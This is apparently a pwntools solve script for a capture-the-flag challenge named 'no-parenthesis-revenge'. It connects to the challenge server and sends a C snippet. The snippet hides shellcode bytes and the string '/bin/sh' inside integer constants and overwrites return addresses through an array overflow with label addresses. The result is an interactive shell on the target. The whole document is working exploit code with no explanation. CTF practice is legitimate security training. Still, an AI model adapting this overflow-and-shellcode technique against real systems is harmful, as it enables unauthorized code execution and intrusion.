from pwn import *

p = remote("no-parenthesis-revenge.challs.csc.tf", 1337)

solve = """
p1: long long a = 0xc33bb0c031; long long* overflow[1]; overflow[0]=&a; p2: a = 0x50f5fd231f631; p3: a = 0x68732f6e69622f; overflow[3] = &&p1 + 2; overflow[4] = &&p2 + 2; overflow[5] = &&p3 + 2; return **overflow;
""".strip()

p.sendlineafter(b"> ", solve.encode())
p.interactive()